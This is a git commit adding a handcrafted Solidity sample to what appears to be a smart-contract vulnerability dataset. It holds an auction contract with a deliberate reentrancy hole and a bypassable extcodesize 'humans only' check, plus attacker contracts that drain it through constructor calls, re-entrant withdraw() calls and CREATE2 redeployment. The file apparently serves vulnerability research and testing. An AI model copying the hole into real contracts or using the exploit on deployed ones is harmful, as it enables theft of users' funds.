5fe3eac65d5cb0bf4b4cc6ec179828daadd76256
Lorenzo Benetollo <lorenzo.benetollo@gmail.com>
2025-10-14 14:50:59 +0200

    Human ree 2

---
+++ dataset/handcrafted/0_8/cross-contract/human/Human_ree2.sol
@@ -0,0 +1,81 @@
+pragma solidity ^0.8.0;
+
+// SPDX-License-Identifier: GPL-3.0
+contract C {
+    mapping (address => uint256) private bids;
+    uint highestBid;
+    address highestBidder;
+
+    modifier isHuman() {
+        address _addr = msg.sender;
+        uint256 _codeLength;
+        assembly {_codeLength := extcodesize(_addr)}
+        require(_codeLength == 0, "sorry humans only");
+        _;
+    }
+
+    function bid() public payable isHuman() {
+        require(msg.value > 0, "no zero value");
+        require(msg.value > highestBid, "no lowballing");
+        highestBid = msg.value;
+        highestBidder = msg.sender;
+        bids[msg.sender] += msg.value;       
+    }
+
+    function withdraw() isHuman() public {
+        uint256 amt = bids[msg.sender];
+        require(amt > 0, "Insufficient funds");
+        (bool success, ) = msg.sender.call{value:amt}("");
+        require(success, "Call failed");
+        bids[msg.sender] = 0;    // side effect after call
+    }
+
+}
+
+contract Attacker {
+    bool public deposited;
+    bytes initCode;
+    uint counter;
+
+    function attack() public {
+        // new Attacker2 with salt here
+        if (counter < 5) {
+            uint salt = 8746532;
+            counter++;
+            new Attacker2{salt: bytes32(salt), value: 1 ether}(deposited);
+        }
+    }
+
+    function setDeposited(bool _deposited) public {
+        deposited = _deposited;
+    }
+
+    function setCoounter(uint _counter) public {
+        counter = _counter;
+    }
+
+    receive() payable external {
+    }
+}
+
+contract Attacker2 {
+    address victim = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;
+    address attacker = 0xbABEBABEBabeBAbEBaBeBabeBABEBabEBAbeBAbe;
+
+    constructor(bool deposited) payable {
+        if(deposited) {
+            C(victim).withdraw();
+        } else {
+            C(victim).bid{value: msg.value}();
+            Attacker(payable(attacker)).setDeposited(true);
+            C(victim).withdraw();
+        }
+
+    }
+
+    receive() payable external {
+        payable(attacker).transfer(msg.value);
+        Attacker(payable(attacker)).attack();
+        C(victim).withdraw();
+    }
+}
